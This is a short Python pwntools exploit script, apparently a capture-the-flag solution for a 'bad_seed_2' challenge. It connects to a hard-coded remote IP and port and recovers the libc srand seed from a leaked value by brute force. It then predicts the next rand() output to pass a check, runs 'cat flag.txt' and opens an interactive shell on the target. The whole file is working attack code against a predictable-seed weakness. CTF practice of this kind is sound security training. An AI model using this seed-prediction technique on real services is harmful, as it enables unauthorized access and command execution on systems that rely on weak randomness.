#!/usr/bin/env python3
from pwn import *
import binascii
import sys
import re
import ctypes

exe_path = 'bad_seed_2_patched'
HOST = '103.77.175.40'
PORT = 6062

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

libc = ctypes.CDLL("libc.so.6")

p = remote(HOST, PORT)

# provoke first value
p.recvuntil(b"Enter your studen ID: ")
p.sendline(b"0")
data = p.recvuntil(b"with ID ")
leak = int(p.recvline().strip())

candidates = []

for s in range(65536):
    libc.srand(s)
    v = libc.rand() % 10000 + 20240000
    if v == leak:
        candidates.append(s)

print("candidates:", len(candidates))

# continue loop
p.sendline(b"Y")
p.recvuntil(b"Enter your studen ID: ")

fail = 0

# predict next value
for s in candidates:
    libc.srand(s)
    libc.rand()
    for _ in range(fail):
        libc.rand()
    guess = libc.rand() % 10000 + 20240000
    p.sendline(str(guess).encode())
    out = p.recvline()

    if b"Here you are!" in out:
        p.sendline(b"cat flag.txt")
        p.interactive()
        break
    else:
        fail += 1
        p.recvuntil(b"(Y/N): ")
        p.sendline(b"Y")
        p.recvuntil(b"Enter your studen ID: ")